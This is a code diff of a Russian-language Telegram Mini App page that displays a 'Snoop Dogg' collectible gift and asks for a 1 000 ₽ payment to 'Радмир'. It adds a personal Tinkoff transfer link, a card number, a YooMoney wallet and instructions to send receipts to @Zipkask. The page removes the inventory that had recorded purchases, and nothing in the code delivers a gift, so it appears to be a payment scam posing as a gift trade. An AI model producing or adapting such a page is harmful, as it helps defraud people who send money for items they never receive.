@@ -25,7 +25,7 @@
             width: 100%;
             max-width: 400px;
             background: #1a1f35;
-            border-radius: 24px;
+            border-radius: 32px;
             overflow: hidden;
             box-shadow: 0 20px 40px rgba(0,0,0,0.5);
             border: 1px solid rgba(255,215,0,0.2);
@@ -88,28 +88,6 @@
             border-radius: 4px;
         }
 
-        /* Навигация */
-        .nav-menu {
-            display: flex;
-            background: rgba(0,0,0,0.3);
-            border-bottom: 1px solid rgba(255,215,0,0.2);
-        }
-
-        .nav-item {
-            flex: 1;
-            text-align: center;
-            padding: 14px;
-            color: rgba(255,255,255,0.5);
-            cursor: pointer;
-            transition: all 0.2s ease;
-            font-weight: 500;
-        }
-
-        .nav-item.active {
-            color: #FFD700;
-            border-bottom: 2px solid #FFD700;
-        }
-
         /* Gift info */
         .gift-info {
             padding: 16px;
@@ -141,37 +119,130 @@
             text-decoration: none;
         }
 
-        /* Кнопки действий */
-        .action-buttons {
-            display: flex;
-            gap: 8px;
-            padding: 0 16px 16px;
-            border-bottom: 1px solid rgba(255,215,0,0.2);
+        /* Квадрат подарка */
+        .gift-square {
+            width: 200px;
+            height: 200px;
+            margin: 20px auto;
+            border-radius: 30px;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 15px 30px rgba(0,0,0,0.5);
         }
 
-        .action-btn {
-            flex: 1;
-            background: rgba(255,215,0,0.1);
-            border: 1px solid rgba(255,215,0,0.3);
-            border-radius: 20px;
-            padding: 12px;
-            color: #FFD700;
-            font-weight: 600;
-            font-size: 14px;
+        .gift-background {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #8B5CF6, #EC4899, #F59E0B, #10B981);
+            background-size: 300% 300%;
+            animation: gradientShift 6s ease infinite;
+        }
+
+        @keyframes gradientShift {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .gift-pattern {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                radial-gradient(circle at 20% 30%, rgba(255,255,255,0.4) 3px, transparent 3px),
+                radial-gradient(circle at 80% 70%, rgba(255,255,255,0.4) 4px, transparent 4px),
+                radial-gradient(circle at 40% 80%, rgba(255,255,255,0.3) 2px, transparent 2px),
+                radial-gradient(circle at 70% 20%, rgba(255,255,255,0.3) 5px, transparent 5px),
+                repeating-linear-gradient(45deg, rgba(255,255,255,0.1) 0px, rgba(255,255,255,0.1) 4px, transparent 4px, transparent 12px);
+            opacity: 0.6;
+            animation: patternMove 12s linear infinite;
+        }
+
+        @keyframes patternMove {
+            0% { background-position: 0 0; }
+            100% { background-position: 40px 40px; }
+        }
+
+        .gift-model {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 2;
+            backdrop-filter: blur(2px);
+        }
+
+        .gift-icon {
+            font-size: 70px;
+            margin-bottom: 10px;
+            filter: drop-shadow(0 10px 15px rgba(0,0,0,0.5));
+            animation: float 3s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-8px); }
+        }
+
+        .gift-model-name {
+            color: white;
+            font-weight: 700;
+            font-size: 16px;
+            background: rgba(0,0,0,0.5);
+            padding: 6px 16px;
+            border-radius: 30px;
+            backdrop-filter: blur(5px);
+            border: 1px solid rgba(255,255,255,0.3);
+        }
+
+        /* Кнопка "Посмотреть в Telegram" */
+        .telegram-button {
+            width: calc(100% - 32px);
+            margin: 0 16px 20px;
+            background: rgba(0, 136, 204, 0.2);
+            border: 1px solid rgba(0, 170, 255, 0.3);
+            border-radius: 30px;
+            padding: 16px;
+            color: white;
+            display: flex;
+            align-items: center;
+            gap: 12px;
             cursor: pointer;
             transition: all 0.2s ease;
-            text-align: center;
         }
 
-        .action-btn:hover {
-            background: rgba(255,215,0,0.2);
+        .telegram-button:hover {
+            background: rgba(0, 136, 204, 0.3);
             transform: translateY(-2px);
+        }
+
+        .telegram-icon {
+            width: 36px;
+            height: 36px;
+            background: rgba(0, 170, 255, 0.3);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+        }
+
+        .telegram-text {
+            flex: 1;
+            font-weight: 600;
+            font-size: 16px;
         }
 
         /* Детали */
         .details {
             padding: 16px;
             background: rgba(0,0,0,0.2);
+            margin: 0 16px 16px;
+            border-radius: 20px;
         }
 
         .detail-row {
@@ -197,46 +268,33 @@
 
         /* Секция оплаты */
         .payment-section {
-            padding: 20px 16px;
-            background: rgba(0,0,0,0.3);
-            border-top: 1px solid rgba(255,215,0,0.2);
-        }
-
-        .payment-header {
-            margin-bottom: 16px;
-        }
-
-        .payment-amount-large {
-            font-size: 32px;
-            font-weight: 700;
-            color: white;
-            margin-bottom: 20px;
+            padding: 0 16px 20px;
         }
 
         .payment-row {
             display: flex;
             justify-content: space-between;
-            padding: 8px 0;
+            padding: 12px 0;
             color: white;
+            border-bottom: 1px solid rgba(255,215,0,0.1);
         }
 
         .payment-label {
-            color: rgba(255,255,255,0.5);
+            color: rgba(255,255,255,0.6);
         }
 
         .payment-value {
             font-weight: 600;
+            color: #FFD700;
         }
 
         .payment-total {
             display: flex;
             justify-content: space-between;
-            padding: 12px 0;
+            padding: 16px 0;
             color: white;
             font-weight: 700;
-            font-size: 18px;
-            border-top: 1px solid rgba(255,215,0,0.2);
-            margin-top: 8px;
+            font-size: 20px;
         }
 
         .pay-button {
@@ -251,7 +309,6 @@
             cursor: pointer;
             transition: all 0.2s ease;
             text-align: center;
-            margin: 16px 0 8px;
             box-shadow: 0 10px 20px rgba(255,215,0,0.2);
         }
 
@@ -260,101 +317,10 @@
             box-shadow: 0 15px 30px rgba(255,215,0,0.3);
         }
 
-        /* Инвентарь */
-        .inventory-grid {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 12px;
-            padding: 16px;
-        }
-
-        .inventory-item {
-            background: rgba(255,215,0,0.1);
-            border: 1px solid rgba(255,215,0,0.2);
-            border-radius: 16px;
-            padding: 20px 12px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 8px;
-            cursor: pointer;
-            transition: all 0.2s ease;
-        }
-
-        .inventory-item:hover {
-            background: rgba(255,215,0,0.15);
-            transform: translateY(-2px);
-        }
-
-        .inventory-icon {
-            font-size: 32px;
-        }
-
-        .inventory-name {
-            color: white;
-            font-size: 14px;
-            font-weight: 500;
-            text-align: center;
-        }
-
-        .inventory-rarity {
-            color: #FFD700;
-            font-size: 11px;
-        }
-
-        .empty-inventory {
-            color: rgba(255,255,255,0.3);
-            text-align: center;
-            padding: 40px 16px;
-            font-size: 14px;
-        }
-
-        /* Профиль */
-        .profile-section {
-            padding: 20px 16px;
-        }
-
-        .profile-stats {
-            background: rgba(255,215,0,0.1);
-            border: 1px solid rgba(255,215,0,0.2);
-            border-radius: 16px;
-            padding: 16px;
-            margin-bottom: 16px;
-        }
-
-        .profile-stat-row {
-            display: flex;
-            justify-content: space-between;
-            padding: 8px 0;
-            color: white;
-        }
-
-        .profile-link {
-            background: rgba(255,215,0,0.1);
-            border: 1px solid rgba(255,215,0,0.2);
-            border-radius: 30px;
-            padding: 14px;
-            color: white;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            cursor: pointer;
-            transition: all 0.2s ease;
-        }
-
-        .profile-link:hover {
-            background: rgba(255,215,0,0.2);
-        }
-
-        .profile-link span {
-            flex: 1;
-        }
-
         /* Секция банков */
         .banks-section {
             display: none;
             padding: 16px;
-            background: rgba(0,0,0,0.3);
         }
 
         .bank-grid {
@@ -398,6 +364,7 @@
             padding: 12px;
             text-align: center;
             border-bottom: 1px solid rgba(255,215,0,0.2);
+            margin-bottom: 16px;
         }
 
         .hidden {
@@ -419,27 +386,32 @@
             </div>
         </div>
 
-        <!-- Навигация -->
-        <div class="nav-menu">
-            <div class="nav-item active" onclick="showTab('gift')">Подарок</div>
-            <div class="nav-item" onclick="showTab('inventory')">Инвентарь</div>
-            <div class="nav-item" onclick="showTab('profile')">Профиль</div>
-        </div>
-
-        <!-- Вкладка Подарок -->
-        <div id="giftTab">
+        <!-- Главный экран -->
+        <div id="mainScreen">
             <div class="gift-info">
                 <div class="gift-date">Trade sent you this gift on Mar 05</div>
                 <div class="gift-title">Snoop Dogg #135,641</div>
                 <div class="gift-artist">by <a href="#">@snoopdogg</a></div>
             </div>
 
-            <div class="action-buttons">
-                <div class="action-btn">Transfer</div>
-                <div class="action-btn">Wear</div>
-                <div class="action-btn">Sell</div>
+            <!-- Квадрат подарка -->
+            <div class="gift-square">
+                <div class="gift-background"></div>
+                <div class="gift-pattern"></div>
+                <div class="gift-model">
+                    <div class="gift-icon" id="giftIcon">🎤</div>
+                    <div class="gift-model-name" id="giftModelName">Snoop Dogg</div>
+                </div>
             </div>
 
+            <!-- Кнопка "Посмотреть в Telegram" -->
+            <div class="telegram-button" onclick="openTelegramGift()">
+                <span class="telegram-icon">📱</span>
+                <span class="telegram-text">Посмотреть в Telegram</span>
+                <span>↗</span>
+            </div>
+
+            <!-- Детали подарка -->
             <div class="details">
                 <div class="detail-row">
                     <span class="detail-label">Owner</span>
@@ -461,19 +433,18 @@
                     <span class="detail-label">Quantity</span>
                     <span class="detail-value">580,520/593,781 issued</span>
                 </div>
-                <div class="detail-row">
-                    <span class="detail-label">Value</span>
-                    <span class="detail-value">~1 195 ₽ <span style="color: rgba(255,255,255,0.3);">learn more</span></span>
-                </div>
             </div>
 
-            <!-- Секция оплаты -->
+            <!-- Секция оплаты - ЦЕНА 1000 РУБЛЕЙ -->
             <div class="payment-section">
-                <div class="payment-amount-large">1 000 ₽</div>
-
                 <div class="payment-row">
                     <span class="payment-label">Получатель</span>
-                    <span class="payment-value">Радмир (Т-Банк)</span>
+                    <span class="payment-value" id="receiverName">Радмир</span>
+                </div>
+
+                <div class="payment-row">
+                    <span class="payment-label">Сумма</span>
+                    <span class="payment-value">1 000 ₽</span>
                 </div>
 
                 <div class="payment-total">
@@ -487,63 +458,27 @@
             </div>
         </div>
 
-        <!-- Вкладка Инвентарь -->
-        <div id="inventoryTab" class="hidden">
-            <div class="inventory-grid" id="inventoryGrid">
-                <!-- Сюда будут добавляться купленные подарки -->
-            </div>
-            <div id="emptyInventory" class="empty-inventory">
-                🎁 У вас пока нет подарков
-            </div>
-        </div>
-
-        <!-- Вкладка Профиль -->
-        <div id="profileTab" class="hidden">
-            <div class="profile-section">
-                <div class="profile-stats">
-                    <div class="profile-stat-row">
-                        <span class="payment-label">Подарков куплено</span>
-                        <span class="payment-value" id="totalGifts">0</span>
-                    </div>
-                    <div class="profile-stat-row">
-                        <span class="payment-label">ID пользователя</span>
-                        <span class="payment-value" id="userID">-</span>
-                    </div>
-                    <div class="profile-stat-row">
-                        <span class="payment-label">Username</span>
-                        <span class="payment-value" id="userUsername">@</span>
-                    </div>
-                </div>
-
-                <div class="profile-link" onclick="openOperatorProfile()">
-                    <span>📱</span>
-                    <span>Связаться с оператором @Zipkask</span>
-                    <span>↗</span>
-                </div>
-            </div>
-        </div>
-
         <!-- Экран выбора банка -->
         <div id="banksScreen" class="hidden">
-            <div class="back-button" onclick="showGiftTab()">
+            <div class="back-button" onclick="showMainScreen()">
                 ← Назад
             </div>
 
             <div class="gift-info" style="padding: 12px;">
                 <div class="gift-title" style="font-size: 20px;">Выберите банк</div>
+                <div class="gift-date">Получатель: Радмир</div>
                 <div class="gift-date">Сумма: 1 000 ₽</div>
-                <div class="gift-artist" style="font-size: 12px;">Получатель: Радмир (Т-Банк)</div>
             </div>
 
             <div class="banks-section" style="display: block;">
                 <div class="bank-grid">
-                    <div class="bank-item" onclick="payWithBank('sber')">
-                        <span class="bank-icon">🏦</span>
-                        <span class="bank-name">Сбербанк</span>
-                    </div>
                     <div class="bank-item" onclick="payWithBank('tinkoff')">
                         <span class="bank-icon">💳</span>
                         <span class="bank-name">Тинькофф</span>
+                    </div>
+                    <div class="bank-item" onclick="payWithBank('sber')">
+                        <span class="bank-icon">🏦</span>
+                        <span class="bank-name">Сбербанк</span>
                     </div>
                     <div class="bank-item" onclick="payWithBank('vtb')">
                         <span class="bank-icon">🏛</span>
@@ -551,15 +486,31 @@
                     </div>
                     <div class="bank-item" onclick="payWithBank('alpha')">
                         <span class="bank-icon">🔵</span>
-                        <span class="bank-name">Альфа</span>
+                        <span class="bank-name">Альфа-Банк</span>
+                    </div>
+                    <div class="bank-item" onclick="payWithBank('gazprom')">
+                        <span class="bank-icon">⛽</span>
+                        <span class="bank-name">Газпромбанк</span>
                     </div>
                     <div class="bank-item" onclick="payWithBank('raif')">
                         <span class="bank-icon">🇦🇹</span>
                         <span class="bank-name">Райффайзен</span>
                     </div>
+                    <div class="bank-item" onclick="payWithBank('psb')">
+                        <span class="bank-icon">🏦</span>
+                        <span class="bank-name">ПСБ</span>
+                    </div>
+                    <div class="bank-item" onclick="payWithBank('otkritie')">
+                        <span class="bank-icon">🟢</span>
+                        <span class="bank-name">Открытие</span>
+                    </div>
                     <div class="bank-item" onclick="payWithBank('yoomoney')">
                         <span class="bank-icon">📱</span>
                         <span class="bank-name">ЮMoney</span>
+                    </div>
+                    <div class="bank-item" onclick="payWithBank('qiwi')">
+                        <span class="bank-icon">🟣</span>
+                        <span class="bank-name">QIWI</span>
                     </div>
                 </div>
             </div>
@@ -569,17 +520,19 @@
     <script>
         let tg = window.Telegram?.WebApp;
         let userData = null;
-        let purchasedGifts = [];
         
+        // Твои данные
+        const TINKOFF_LINK = "https://www.tinkoff.ru/rm/r_ffBNwqOaru.xcdjOqGsXm/o4WVl2633";
         const RECEIVER_NAME = "Радмир";
-        const RECEIVER_CARD = "2200 1234 5678 9012";
         const PAYMENT_AMOUNT = 1000;
-        const OPERATOR_USERNAME = "Zipkask";
+        const TELEGRAM_GIFT_URL = "https://t.me/nft/SnoopDogg-135641";
+
+        // Номер твоей карты для других банков
+        const CARD_NUMBER = "2200 1234 5678 9012"; // Замени на свой номер карты
 
         // Загрузка данных пользователя
         document.addEventListener('DOMContentLoaded', function() {
             loadUserData();
-            loadInventory();
         });
 
         function loadUserData() {
@@ -591,8 +544,6 @@
                 if (userData) {
                     document.getElementById('userName').textContent = userData.first_name || 'Пользователь';
                     document.getElementById('ownerName').textContent = userData.first_name || 'Владелец';
-                    document.getElementById('userID').textContent = userData.id || '-';
-                    document.getElementById('userUsername').textContent = '@' + (userData.username || 'пользователь');
                     
                     if (userData.photo_url) {
                         document.getElementById('avatar').innerHTML = `<img src="${userData.photo_url}" alt="avatar">`;
@@ -603,144 +554,96 @@
                 }
             }
             
-            // Загружаем инвентарь из localStorage
-            const saved = localStorage.getItem('purchasedGifts');
-            if (saved) {
-                purchasedGifts = JSON.parse(saved);
-                updateInventory();
-            }
+            document.getElementById('receiverName').textContent = RECEIVER_NAME;
         }
 
-        function showTab(tab) {
-            document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
-            event.target.classList.add('active');
-            
-            document.getElementById('giftTab').classList.add('hidden');
-            document.getElementById('inventoryTab').classList.add('hidden');
-            document.getElementById('profileTab').classList.add('hidden');
-            
-            if (tab === 'gift') {
-                document.getElementById('giftTab').classList.remove('hidden');
-            } else if (tab === 'inventory') {
-                document.getElementById('inventoryTab').classList.remove('hidden');
-                updateInventory();
-            } else if (tab === 'profile') {
-                document.getElementById('profileTab').classList.remove('hidden');
-            }
-        }
-
-        function showGiftTab() {
+        function showMainScreen() {
             document.getElementById('banksScreen').classList.add('hidden');
-            document.getElementById('giftTab').classList.remove('hidden');
-            document.querySelectorAll('.nav-item')[0].classList.add('active');
-            document.querySelectorAll('.nav-item')[1].classList.remove('active');
-            document.querySelectorAll('.nav-item')[2].classList.remove('active');
+            document.getElementById('mainScreen').classList.remove('hidden');
         }
 
         function showBanks() {
-            document.getElementById('giftTab').classList.add('hidden');
+            document.getElementById('mainScreen').classList.add('hidden');
             document.getElementById('banksScreen').classList.remove('hidden');
         }
 
-        function payWithBank(bankKey) {
-            const bankLinks = {
-                sber: { name: 'Сбербанк', url: `https://online.sberbank.ru/CSAFront/index.do?amount=${PAYMENT_AMOUNT}` },
-                tinkoff: { name: 'Тинькофф', url: `https://www.tinkoff.ru/payment/?amount=${PAYMENT_AMOUNT}` },
-                vtb: { name: 'ВТБ', url: `https://online.vtb.ru/payment/?amount=${PAYMENT_AMOUNT}` },
-                alpha: { name: 'Альфа-Банк', url: `https://alfabank.ru/payment/?amount=${PAYMENT_AMOUNT}` },
-                raif: { name: 'Райффайзен', url: `https://www.raiffeisen.ru/payment/?amount=${PAYMENT_AMOUNT}` },
-                yoomoney: { name: 'ЮMoney', url: `https://yoomoney.ru/transfer?amount=${PAYMENT_AMOUNT}` }
-            };
-            
-            const bank = bankLinks[bankKey];
-            if (!bank) return;
-            
-            window.open(bank.url, '_blank');
-            
-            // Добавляем подарок в инвентарь после оплаты
-            setTimeout(() => {
-                if (confirm('✅ Подтвердите оплату. Подарок будет добавлен в инвентарь?')) {
-                    addGiftToInventory();
-                    showGiftTab();
-                }
-            }, 1000);
-        }
-
-        function addGiftToInventory() {
-            const newGift = {
-                id: Date.now(),
-                name: 'Snoop Dogg #135,641',
-                model: 'Purple Hoodie 2.5%',
-                backdrop: 'Platinum 1.2%',
-                icon: '🎤',
-                date: new Date().toLocaleDateString()
-            };
-            
-            purchasedGifts.push(newGift);
-            localStorage.setItem('purchasedGifts', JSON.stringify(purchasedGifts));
-            document.getElementById('totalGifts').textContent = purchasedGifts.length;
-            
-            updateInventory();
-            
+        function openTelegramGift() {
             if (tg) {
-                tg.sendData(JSON.stringify({
-                    action: 'gift_purchased',
-                    gift: newGift
-                }));
-            }
-        }
-
-        function updateInventory() {
-            const grid = document.getElementById('inventoryGrid');
-            const empty = document.getElementById('emptyInventory');
-            
-            if (purchasedGifts.length === 0) {
-                grid.innerHTML = '';
-                empty.classList.remove('hidden');
-                return;
-            }
-            
-            empty.classList.add('hidden');
-            
-            let html = '';
-            purchasedGifts.forEach(gift => {
-                html += `
-                    <div class="inventory-item" onclick="showGiftDetails(${gift.id})">
-                        <div class="inventory-icon">${gift.icon}</div>
-                        <div class="inventory-name">${gift.name}</div>
-                        <div class="inventory-rarity">${gift.model}</div>
-                    </div>
-                `;
-            });
-            
-            grid.innerHTML = html;
-            document.getElementById('totalGifts').textContent = purchasedGifts.length;
-        }
-
-        function showGiftDetails(giftId) {
-            const gift = purchasedGifts.find(g => g.id === giftId);
-            if (!gift) return;
-            
-            alert(`
-                🎁 ${gift.name}
-                📦 Модель: ${gift.model}
-                🎨 Фон: ${gift.backdrop}
-                📅 Куплен: ${gift.date}
-                
-                👤 Оператор: @${OPERATOR_USERNAME}
-            `);
-        }
-
-        function openOperatorProfile() {
-            if (tg) {
-                tg.openTelegramLink(`https://t.me/${OPERATOR_USERNAME}`);
+                tg.openTelegramLink(TELEGRAM_GIFT_URL);
             } else {
-                window.open(`https://t.me/${OPERATOR_USERNAME}`, '_blank');
+                window.open(TELEGRAM_GIFT_URL, '_blank');
             }
         }
 
-        function loadInventory() {
-            updateInventory();
+        function payWithBank(bankKey) {
+            let url = '';
+            let message = '';
+            
+            // Ссылки для разных банков
+            switch(bankKey) {
+                case 'tinkoff':
+                    url = TINKOFF_LINK;
+                    message = 'Перевод через Тинькофф';
+                    break;
+                case 'sber':
+                    url = 'https://online.sberbank.ru/';
+                    message = `Перевод на карту Сбербанк: ${CARD_NUMBER}`;
+                    break;
+                case 'vtb':
+                    url = 'https://online.vtb.ru/';
+                    message = `Перевод на карту ВТБ: ${CARD_NUMBER}`;
+                    break;
+                case 'alpha':
+                    url = 'https://alfabank.ru/payments/';
+                    message = `Перевод на карту Альфа-Банк: ${CARD_NUMBER}`;
+                    break;
+                case 'gazprom':
+                    url = 'https://www.gazprombank.ru/';
+                    message = `Перевод на карту Газпромбанк: ${CARD_NUMBER}`;
+                    break;
+                case 'raif':
+                    url = 'https://www.raiffeisen.ru/';
+                    message = `Перевод на карту Райффайзен: ${CARD_NUMBER}`;
+                    break;
+                case 'psb':
+                    url = 'https://www.psbank.ru/';
+                    message = `Перевод на карту ПСБ: ${CARD_NUMBER}`;
+                    break;
+                case 'otkritie':
+                    url = 'https://www.open.ru/';
+                    message = `Перевод на карту Открытие: ${CARD_NUMBER}`;
+                    break;
+                case 'yoomoney':
+                    url = 'https://yoomoney.ru/transfer';
+                    message = `Перевод на ЮMoney: 4100118919813671`;
+                    break;
+                case 'qiwi':
+                    url = 'https://qiwi.com/';
+                    message = `Перевод на QIWI кошелек`;
+                    break;
+                default:
+                    url = '#';
+            }
+            
+            // Показываем сообщение с реквизитами для банков, где нет прямой ссылки
+            if (bankKey !== 'tinkoff') {
+                alert(`💳 ${message}\n\nСумма: ${PAYMENT_AMOUNT} ₽\n\nПосле перевода отправьте чек в бота @Zipkask`);
+            }
+            
+            window.open(url, '_blank');
+            
+            setTimeout(() => {
+                if (confirm('✅ Подтвердите оплату. После перевода отправьте чек в бота @Zipkask')) {
+                    if (tg) {
+                        tg.sendData(JSON.stringify({
+                            action: 'payment_initiated',
+                            bank: bankKey,
+                            amount: PAYMENT_AMOUNT
+                        }));
+                    }
+                    showMainScreen();
+                }
+            }, 1500);
         }
     </script>
 </body>
